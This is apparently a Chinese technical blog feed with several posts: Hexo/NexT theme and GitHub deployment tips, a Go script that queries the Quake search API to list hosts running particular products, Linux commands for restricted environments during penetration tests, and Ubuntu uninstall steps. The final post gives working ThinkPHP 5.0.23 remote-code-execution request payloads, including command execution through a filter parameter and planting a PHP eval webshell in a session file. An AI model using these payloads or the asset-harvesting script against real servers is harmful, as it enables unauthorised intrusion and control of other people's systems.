<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">symbols_count_time:</span><br><span class="line">  # 每篇文章显示</span><br><span class="line">  symbols: true</span><br><span class="line">  time: true</span><br><span class="line">  # 文章底部显示</span><br><span class="line">  total_symbols: false  </span><br><span class="line">  total_time: false</span><br><span class="line">  # 是否统计代码块</span><br><span class="line">  exclude_codeblock: false</span><br><span class="line">  awl: 2</span><br><span class="line">  wpm: 275</span><br><span class="line">  suffix: &quot;mins.&quot;</span><br></pre></td></tr></table></figure>

<h3 id="隐藏网页底部-powered-By"><a href="#隐藏网页底部-powered-By" class="headerlink" title="隐藏网页底部 powered By"></a>隐藏网页底部 powered By</h3><p><img src="/images/image-20230428111012051.png" alt="image-20230428111012051"></p>
<p>打开</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">themes/next/layout/_partials/footer.njk</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230428111327561.png" alt="image-20230428111327561"></p>
<p>把这段代码注释了</p>
<p><img src="/images/image-20230428111402508.png" alt="image-20230428111402508"></p>
<h3 id="添加分类"><a href="#添加分类" class="headerlink" title="添加分类"></a>添加分类</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure>

<p>主题的_config.yml文件中开启categories</p>
<p><img src="/images/image-20230428140807260.png" alt="image-20230428140807260"></p>
<p>在文章开头添加yml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: text222222</span><br><span class="line">author: fn</span><br><span class="line">type: &quot;categories&quot;</span><br><span class="line">categories: </span><br><span class="line">- Android</span><br></pre></td></tr></table></figure>

<p>点击文章可以看到分类</p>
<p><img src="/images/image-20230428141302810.png" alt="image-20230428141302810"></p>
<p>但是直接点分类却不会看到分类</p>
<p><img src="/images/image-20230428141350416.png" alt="image-20230428141350416"></p>
<p>这里还需要有一个关键的操作</p>
<p>调用hexo new page xxx后，会在&#x2F;source&#x2F;categories&#x2F;目录下生成一个index.md文档</p>
<p>需要在index.md头部添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: categories</span><br><span class="line">type: &quot;categories&quot;</span><br></pre></td></tr></table></figure>

<p>title可以自定义</p>
<p><img src="/images/image-20230428142249649.png" alt="image-20230428142249649"></p>
<h3 id="更改首页"><a href="#更改首页" class="headerlink" title="更改首页"></a>更改首页</h3><p>Next默认是会显示全文的</p>
<h5 id="方法1-文章添加description头"><a href="#方法1-文章添加description头" class="headerlink" title="方法1 文章添加description头"></a>方法1 文章添加description头</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: text222222</span><br><span class="line">author: fn</span><br><span class="line">description: f</span><br><span class="line">type: &quot;categories&quot;</span><br><span class="line">categories: </span><br><span class="line">- Android</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230428144425660.png" alt="image-20230428144425660"></p>
<h5 id="方法2-文章截断"><a href="#方法2-文章截断" class="headerlink" title="方法2 文章截断"></a>方法2 文章截断</h5><p>方法二：文章截断</p>
<p>在需要截断的地方加入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--more--&gt;</span><br></pre></td></tr></table></figure>

<p>首页就会显示这条以上的所有内容，隐藏接下来的所有内容。<br>例如本文会显示到修改配置上面。</p>
<p><img src="/images/image-20230428145348111.png" alt="image-20230428145348111"></p>
<p>显示出来就是</p>
<p><img src="/images/image-20230428145359118.png" alt="image-20230428145359118"></p>
<h3 id="更改为黑暗模式"><a href="#更改为黑暗模式" class="headerlink" title="更改为黑暗模式"></a>更改为黑暗模式</h3><p>将主题的_config,yml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dark Mode</span><br></pre></td></tr></table></figure>

<p>打开即可</p>
<p><img src="/images/image-20230428145630626.png" alt="image-20230428145630626"></p>
<h3 id="去除分类中的日期"><a href="#去除分类中的日期" class="headerlink" title="去除分类中的日期"></a>去除分类中的日期</h3><p>分类中总是会显示一个日期，如何隐藏</p>
<p><img src="/images/image-20230428150321532.png" alt="image-20230428150321532"></p>
<p>找到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\themes\next\layout\_macro\post-collapse.njk</span><br></pre></td></tr></table></figure>

<p>注释掉</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;span class=&quot;collection-header&quot;&gt;&#123;&#123; current_year &#125;&#125;&lt;/span&gt;</span><br></pre></td></tr></table></figure>

<p>这一行（在两侧加），可以隐藏开始的年份。</p>
<p>将</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123; date(post.date, &#x27;MM-DD&#x27;) &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这一行中的MM-DD换为空格，可隐藏标题前的日期</p>
<p><img src="/images/image-20230428150704733.png" alt="image-20230428150704733"></p>
<p>刷新下，日期就没了</p>
<p><img src="/images/image-20230428150739679.png" alt="image-20230428150739679"></p>
<h3 id="修改中文固定字段"><a href="#修改中文固定字段" class="headerlink" title="修改中文固定字段"></a>修改中文固定字段</h3><p>日志中的这段字也可以修改</p>
<p><img src="/images/image-20230428151201873.png" alt="image-20230428151201873"></p>
<p>找到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\themes\next\languages\zh-CN.yml</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230428151509097.png" alt="image-20230428151509097"></p>
<p>找到想改的字段修改即可</p>
<p>也可以修改下述文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\themes\next\layout\archive.njk</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230428152726505.png" alt="image-20230428152726505"></p>
<p>将上图所在行注释掉</p>
<p><img src="/images/image-20230428152856461.png" alt="image-20230428152856461"></p>
<h2 id="ssh连接github"><a href="#ssh连接github" class="headerlink" title="ssh连接github"></a>ssh连接github</h2><h3 id="公私钥准备"><a href="#公私钥准备" class="headerlink" title="公私钥准备"></a>公私钥准备</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -C &quot;xxxx@qq.com&quot;</span><br></pre></td></tr></table></figure>

<p>-C是用户注释，这里填上登录github的邮箱即可</p>
<p><img src="/images/image-20230427170950384.png" alt="image-20230427170950384"></p>
<p>如果没有指定-f参数,默认情况下文件名为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- id_rsa (私钥)</span><br><span class="line">- id_rsa.pub (公钥)</span><br></pre></td></tr></table></figure>

<p>或者可以指定参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -C &quot;xxxx@qq.com&quot; -f github</span><br></pre></td></tr></table></figure>

<p>注意：这里建议使用默认，不然后面上传的时候会出错</p>
<p>密钥保存位置在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\用户名\.ssh</span><br></pre></td></tr></table></figure>

<h3 id="github添加公钥"><a href="#github添加公钥" class="headerlink" title="github添加公钥"></a>github添加公钥</h3><p>进入到设置，找到SSH and GPG keys</p>
<p>选择New SSH key</p>
<p><img src="/images/image-20230427171420609.png" alt="image-20230427171420609"></p>
<p>将刚刚生成的公钥部分填写进去</p>
<p><img src="/images/image-20230427171535373.png" alt="image-20230427171535373"></p>
<p><img src="/images/image-20230427171615992.png" alt="image-20230427171615992"></p>
<h3 id="连接ssh"><a href="#连接ssh" class="headerlink" title="连接ssh"></a>连接ssh</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230504202143593.png" alt="image-20230504202143593"></p>
<p>当出现successfully就证明没问题了</p>
<h2 id="发布前准备"><a href="#发布前准备" class="headerlink" title="发布前准备"></a>发布前准备</h2><p>先将github的默认分支改为master</p>
<p><img src="/images/image-20230504204811300.png" alt="image-20230504204811300"></p>
<p>将email中的Keep my email addresses private取消勾选</p>
<p><img src="/images/image-20230504205217157.png" alt="image-20230504205217157"></p>
<h2 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h2><p>本地看后没问题，就可以发布到github了</p>
<p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230504135150341.png" alt="image-20230504135150341"></p>
<p>修改blog根目录_config.yml文件末尾的 Deployment 部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:用户名/用户名.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230504135925303.png" alt="image-20230504135925303"></p>
<p>上述配置完成后即可上传</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<p>这里如果是windows系统的话需要使用git bash</p>
<p><img src="/images/image-20230504205720366.png" alt="image-20230504205720366"></p>
<h2 id="发布后问题解决"><a href="#发布后问题解决" class="headerlink" title="发布后问题解决"></a>发布后问题解决</h2><p>发布后会发现图片还是有问题</p>
<p><img src="/images/image-20230504211422453.png" alt="image-20230504211422453"></p>
<p>打开图片看看链接，可以看到文件的路径被编码了</p>
<p><img src="/images/image-20230504211501815.png" alt="image-20230504211501815"></p>
<p>当我们把其换回斜杠，图片成功加载，所以我们就解决编码的问题就行</p>
<p><img src="/images/image-20230504211639038.png" alt="image-20230504211639038"></p>
<p>这里其实是正反斜杠的问题</p>
<p><img src="/images/image-20230504212739811.png" alt="image-20230504212739811"></p>
<p>需要将”\“改为”&#x2F;“</p>
<p><img src="/images/image-20230504212829471.png" alt="image-20230504212829471"></p>
]]></content>
      <categories>
        <category>ForGithub</category>
      </categories>
  </entry>
  <entry>
    <title>调用quake api找寻资产</title>
    <url>/2023/05/04/ForGolang/%E8%B0%83%E7%94%A8quake%E7%9A%84api/</url>
    <content><![CDATA[<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p><a href="https://quake.360.net/quake/#/help?id=5eb6034cae8bfd3a910f836f&title=%E4%B8%BB%E6%9C%BA%E6%95%B0%E6%8D%AE%E6%8E%A5%E5%8F%A3">https://quake.360.net/quake/#/help?id=5eb6034cae8bfd3a910f836f&amp;title=%E4%B8%BB%E6%9C%BA%E6%95%B0%E6%8D%AE%E6%8E%A5%E5%8F%A3</a></p>
<h3 id="调用实时主机信息api"><a href="#调用实时主机信息api" class="headerlink" title="调用实时主机信息api"></a>调用实时主机信息api</h3><h5 id="范例"><a href="#范例" class="headerlink" title="范例"></a>范例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST &quot;https://quake.360.net/api/v3/search/quake_host&quot; -H &quot;X-QuakeToken: d17140ae-xxxx-xxx-xxxx-c0818b2bbxxx&quot; -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;</span><br><span class="line">     &quot;query&quot;: &quot;service: http&quot;,</span><br><span class="line">     &quot;start&quot;: 20,</span><br><span class="line">     &quot;size&quot;: 10,</span><br><span class="line">     &quot;ignore_cache&quot;: false,</span><br><span class="line">     &quot;start_time&quot;: &quot;2021-01-01 00:00:00&quot;,</span><br><span class="line">     &quot;end_time&quot;: &quot;2021-02-01 00:00:00&quot;</span><br><span class="line">&#125;&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="返回值示例"><a href="#返回值示例" class="headerlink" title="返回值示例"></a>返回值示例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: 0,</span><br><span class="line">  &quot;message&quot;: &quot;Successful.&quot;,</span><br><span class="line">  &quot;data&quot;: [</span><br><span class="line">      // 返回数据</span><br><span class="line">  ],</span><br><span class="line">  &quot;meta&quot;: &#123;</span><br><span class="line">    &quot;pagination&quot;: &#123;</span><br><span class="line">      &quot;count&quot;: 1,</span><br><span class="line">      &quot;page_index&quot;: 1,</span><br><span class="line">      &quot;page_size&quot;: 1,</span><br><span class="line">      &quot;total&quot;: 68184</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="golang实现"><a href="#golang实现" class="headerlink" title="golang实现"></a>golang实现</h5><p>将json数据中的ip和端口信息提取出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package quake</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;bytes&quot;</span><br><span class="line">	&quot;encoding/json&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line">	&quot;strconv&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">	//主机数据实时查询接口</span><br><span class="line">	quakeUrl = &quot;https://quake.360.net/api/v3/search/quake_host&quot;</span><br><span class="line">	//quake API token</span><br><span class="line">	quakeToken = &quot;xxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span><br><span class="line"></span><br><span class="line">	//请求包的json参数</span><br><span class="line">	query        = `app:&quot;泛微协同办公OA&quot;`</span><br><span class="line">	start        = 1</span><br><span class="line">	size         = 100</span><br><span class="line">	ignore_cache = false</span><br><span class="line">	start_time   = &quot;2023-01-01 00:00:00&quot;</span><br><span class="line">	end_time     = &quot;2023-04-25 00:00:00&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func QuakeGetIp() &#123;</span><br><span class="line">	//配置body的json</span><br><span class="line">	data := map[string]interface&#123;&#125;&#123;</span><br><span class="line">		&quot;query&quot;:        query,</span><br><span class="line">		&quot;start&quot;:        start,</span><br><span class="line">		&quot;size&quot;:         size,</span><br><span class="line">		&quot;ignore_cache&quot;: ignore_cache,</span><br><span class="line">		&quot;start_time&quot;:   start_time,</span><br><span class="line">		&quot;end_time&quot;:     end_time,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	jsonData, _ := json.Marshal(data)</span><br><span class="line">	// 创建请求</span><br><span class="line">	req, err := http.NewRequest(&quot;POST&quot;, quakeUrl, bytes.NewBuffer(jsonData))</span><br><span class="line">	checkErr(err)</span><br><span class="line"></span><br><span class="line">	//设置请求头</span><br><span class="line">	req.Header.Set(&quot;X-QuakeToken&quot;, quakeToken)</span><br><span class="line">	req.Header.Set(&quot;Content-Type&quot;, &quot;application/json&quot;)</span><br><span class="line"></span><br><span class="line">	// 创建一个HTTP客户端</span><br><span class="line">	client := &amp;http.Client&#123;&#125;</span><br><span class="line"></span><br><span class="line">	// 发送请求</span><br><span class="line">	resp, err := client.Do(req)</span><br><span class="line">	checkErr(err)</span><br><span class="line"></span><br><span class="line">	//读取响应的内容</span><br><span class="line">	var result map[string]interface&#123;&#125;</span><br><span class="line">	json.NewDecoder(resp.Body).Decode(&amp;result)</span><br><span class="line"></span><br><span class="line">	ip := &quot;&quot;</span><br><span class="line">	var port float64</span><br><span class="line">	for _, info := range result[&quot;data&quot;].([]interface&#123;&#125;) &#123;</span><br><span class="line">		ip = info.(map[string]interface&#123;&#125;)[&quot;ip&quot;].(string)</span><br><span class="line">		port = info.(map[string]interface&#123;&#125;)[&quot;services&quot;].([]interface&#123;&#125;)[0].(map[string]interface&#123;&#125;)[&quot;port&quot;].(float64)</span><br><span class="line">		fmt.Println(ip + &quot;:&quot; + strconv.FormatFloat(port, &#x27;f&#x27;, 0, 64))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func checkErr(err error) &#123;</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="判断是http还是https"><a href="#判断是http还是https" class="headerlink" title="判断是http还是https"></a>判断是http还是https</h5><p>quake的返回包中存在一个name字段，http就是http请求，http&#x2F;ssl就是https</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for _, info := range result[&quot;data&quot;].([]interface&#123;&#125;) &#123;</span><br><span class="line">	//name用于判断是http还是https</span><br><span class="line">	name = info.(map[string]interface&#123;&#125;)[&quot;services&quot;].([]interface&#123;&#125;)[0].(map[string]interface&#123;&#125;)[&quot;name&quot;].(string)</span><br><span class="line">	ip = info.(map[string]interface&#123;&#125;)[&quot;ip&quot;].(string)</span><br><span class="line">	port = info.(map[string]interface&#123;&#125;)[&quot;services&quot;].([]interface&#123;&#125;)[0].(map[string]interface&#123;&#125;)[&quot;port&quot;].(float64)</span><br><span class="line">	if name == &quot;http&quot; &#123;</span><br><span class="line">		url = &quot;http://&quot; + ip + &quot;:&quot; + strconv.FormatFloat(port, &#x27;f&#x27;, 0, 64)</span><br><span class="line">	&#125; else if name == &quot;http/ssl&quot; &#123;</span><br><span class="line">		url = &quot;https://&quot; + ip + &quot;:&quot; + strconv.FormatFloat(port, &#x27;f&#x27;, 0, 64)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(url)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="最终的quake查找url的代码"><a href="#最终的quake查找url的代码" class="headerlink" title="最终的quake查找url的代码"></a>最终的quake查找url的代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package quake</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;bytes&quot;</span><br><span class="line">	&quot;encoding/json&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line">	&quot;strconv&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">	//主机数据实时查询接口</span><br><span class="line">	quakeUrl = &quot;https://quake.360.net/api/v3/search/quake_host&quot;</span><br><span class="line">	//quake API token</span><br><span class="line">	quakeToken = &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span><br><span class="line"></span><br><span class="line">	//请求包的json参数</span><br><span class="line">	query        = `app:&quot;SpringBoot框架&quot; AND country_cn: &quot;中国&quot;`</span><br><span class="line">	start        = 1</span><br><span class="line">	size         = 5000</span><br><span class="line">	ignore_cache = true</span><br><span class="line">	start_time   = &quot;2023-01-01 00:00:00&quot;</span><br><span class="line">	end_time     = &quot;2023-04-28 00:00:00&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func QuakeGetURL() []string &#123;</span><br><span class="line">	//配置请求包的body的json</span><br><span class="line">	data := map[string]interface&#123;&#125;&#123;</span><br><span class="line">		&quot;query&quot;:        query,</span><br><span class="line">		&quot;start&quot;:        start,</span><br><span class="line">		&quot;size&quot;:         size,</span><br><span class="line">		&quot;ignore_cache&quot;: ignore_cache,</span><br><span class="line">		&quot;start_time&quot;:   start_time,</span><br><span class="line">		&quot;end_time&quot;:     end_time,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	jsonData, _ := json.Marshal(data)</span><br><span class="line">	// 创建请求</span><br><span class="line">	req, err := http.NewRequest(&quot;POST&quot;, quakeUrl, bytes.NewBuffer(jsonData))</span><br><span class="line">	checkErr(err)</span><br><span class="line"></span><br><span class="line">	//设置请求头</span><br><span class="line">	req.Header.Set(&quot;X-QuakeToken&quot;, quakeToken)</span><br><span class="line">	req.Header.Set(&quot;Content-Type&quot;, &quot;application/json&quot;)</span><br><span class="line"></span><br><span class="line">	// 创建一个HTTP客户端</span><br><span class="line">	client := &amp;http.Client&#123;&#125;</span><br><span class="line"></span><br><span class="line">	// 发送请求</span><br><span class="line">	resp, err := client.Do(req)</span><br><span class="line">	checkErr(err)</span><br><span class="line"></span><br><span class="line">	//读取响应的内容</span><br><span class="line">	var result map[string]interface&#123;&#125;</span><br><span class="line">	json.NewDecoder(resp.Body).Decode(&amp;result)</span><br><span class="line"></span><br><span class="line">	var urlArr []string</span><br><span class="line">	url := &quot;&quot;</span><br><span class="line">	ip := &quot;&quot;</span><br><span class="line">	var port float64</span><br><span class="line">	name := &quot;&quot;</span><br><span class="line">	for _, info := range result[&quot;data&quot;].([]interface&#123;&#125;) &#123;</span><br><span class="line">		//name用于判断是http还是https</span><br><span class="line">		name = info.(map[string]interface&#123;&#125;)[&quot;services&quot;].([]interface&#123;&#125;)[0].(map[string]interface&#123;&#125;)[&quot;name&quot;].(string)</span><br><span class="line">		ip = info.(map[string]interface&#123;&#125;)[&quot;ip&quot;].(string)</span><br><span class="line">		port = info.(map[string]interface&#123;&#125;)[&quot;services&quot;].([]interface&#123;&#125;)[0].(map[string]interface&#123;&#125;)[&quot;port&quot;].(float64)</span><br><span class="line">		if name == &quot;http&quot; &#123;</span><br><span class="line">			url = &quot;http://&quot; + ip + &quot;:&quot; + strconv.FormatFloat(port, &#x27;f&#x27;, 0, 64)</span><br><span class="line">		&#125; else if name == &quot;http/ssl&quot; &#123;</span><br><span class="line">			url = &quot;https://&quot; + ip + &quot;:&quot; + strconv.FormatFloat(port, &#x27;f&#x27;, 0, 64)</span><br><span class="line">		&#125;</span><br><span class="line">		urlArr = append(urlArr, url)</span><br><span class="line">	&#125;</span><br><span class="line">	return urlArr</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func checkErr(err error) &#123;</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ForGolang</category>
      </categories>
  </entry>
  <entry>
    <title>渗透过程中针对限制环境的一些命令</title>
    <url>/2023/05/30/Linux%E7%9B%B8%E5%85%B3/%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B%E4%B8%AD%E9%99%90%E5%88%B6%E7%8E%AF%E5%A2%83%E7%9A%84%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>在渗透过程中，常常会遇到一些容器等环境，很多linux命令并不存在</p>
<p>这个时候就需要一些其他的命令来替代</p>
<h3 id="替代ifconfig"><a href="#替代ifconfig" class="headerlink" title="替代ifconfig"></a>替代ifconfig</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip address</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230530091659821.png" alt="image-20230530091659821"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230530092439452.png" alt="image-20230530092439452"></p>
<h3 id="替代netstat"><a href="#替代netstat" class="headerlink" title="替代netstat"></a>替代netstat</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ss -a</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230530092257756.png" alt="image-20230530092257756"></p>
<h3 id="输出公网ip"><a href="#输出公网ip" class="headerlink" title="输出公网ip"></a>输出公网ip</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl ifconfig.me</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230530092605519.png" alt="image-20230530092605519"></p>
]]></content>
      <categories>
        <category>Linux相关</category>
      </categories>
  </entry>
  <entry>
    <title>ubuntu彻底卸载软件</title>
    <url>/2023/05/31/Linux%E7%9B%B8%E5%85%B3/ubuntu%E5%BD%BB%E5%BA%95%E5%8D%B8%E8%BD%BD%E8%BD%AF%E4%BB%B6/</url>
    <content><![CDATA[<h3 id="如果知道软件的具体名称"><a href="#如果知道软件的具体名称" class="headerlink" title="如果知道软件的具体名称"></a>如果知道软件的具体名称</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove --purge 软件名称  </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get autoremove --purge 软件名称</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230531091751652.png" alt="image-20230531091751652"></p>
<h3 id="如果不知道要删除软件的具体名称"><a href="#如果不知道要删除软件的具体名称" class="headerlink" title="如果不知道要删除软件的具体名称"></a>如果不知道要删除软件的具体名称</h3><h5 id="列出软件的具体名称"><a href="#列出软件的具体名称" class="headerlink" title="列出软件的具体名称"></a>列出软件的具体名称</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpkg --get-selections | grep ‘软件相关名称’</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230531091900581.png" alt="image-20230531091900581"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpkg --list | grep ‘软件相关名称’</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230531092119136.png" alt="image-20230531092119136"></p>
<h5 id="卸载程序"><a href="#卸载程序" class="headerlink" title="卸载程序"></a>卸载程序</h5><p>除了上述使用的命令，还可以使用下述命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get purge ‘软件相关名称’</span><br></pre></td></tr></table></figure>

<p>一个带core的package，如果没有带core的package，则是情况而定。</p>
<p><img src="/images/image-20230531092214242.png" alt="image-20230531092214242"></p>
<h3 id="清理残留数据"><a href="#清理残留数据" class="headerlink" title="清理残留数据"></a>清理残留数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpkg -l |grep ^rc|awk &#x27;&#123;print $2&#125;&#x27; |sudo xargs dpkg -P </span><br></pre></td></tr></table></figure>

<p>此时清理的是所有已卸载程序的残留数据，不止是上述卸载的程序</p>
<p><img src="/images/image-20230531092302141.png" alt="image-20230531092302141"></p>
<h5 id="如果此时没有残留数据"><a href="#如果此时没有残留数据" class="headerlink" title="如果此时没有残留数据"></a>如果此时没有残留数据</h5><p>则会出现err</p>
<p><img src="/images/image-20230531092522589.png" alt="image-20230531092522589"></p>
<p>就算给出具体的软件名，也会出现”未安装”的提示</p>
<p><img src="/images/image-20230531092613122.png" alt="image-20230531092613122"></p>
]]></content>
      <categories>
        <category>Linux相关</category>
      </categories>
  </entry>
  <entry>
    <title>thinkphp 5.0.23-RCE利用</title>
    <url>/2023/05/18/POC/thinkphp%205.0.23-RCE%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h2 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a>基础payload</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: 1.1.1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Wed, 27 Feb 2019 06:32:09 GMT</span><br><span class="line">If-None-Match: &quot;5c762ee9-5&quot;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 76</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230518090910918.png" alt="image-20230518090910918"></p>
<h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: 1.1.1.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 135</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=/tmp/sess_5tc1epe1vuk0uqdfssbvvc3pe7&amp;x=phpinfo();</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230517225116294.png" alt="image-20230517225116294"></p>
<h2 id="构造数据包直接连接webshell"><a href="#构造数据包直接连接webshell" class="headerlink" title="构造数据包直接连接webshell"></a>构造数据包直接连接webshell</h2><p>利用方式和包含日志文件sess_xxxxxxxx类似，需要先将马先写入sess_xxxxxxxx日志文件中</p>
<p>而这个sess_文件的名称是通过Cookie: PHPSESSID&#x3D;xxxxxxx来指定的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=good123123</span><br></pre></td></tr></table></figure>

<p>则日志文件名为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sess_good123123</span><br></pre></td></tr></table></figure>

<p>linux中通常放置于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp/sess_good123123</span><br></pre></td></tr></table></figure>

<h3 id="创建session文件"><a href="#创建session文件" class="headerlink" title="创建session文件"></a>创建session文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=think\Session::set&amp;method=GET&amp;server[REQUEST_METHOD]=&lt;?php eval($_POST[&#x27;abc&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp/sess_2333shell</span><br></pre></td></tr></table></figure>

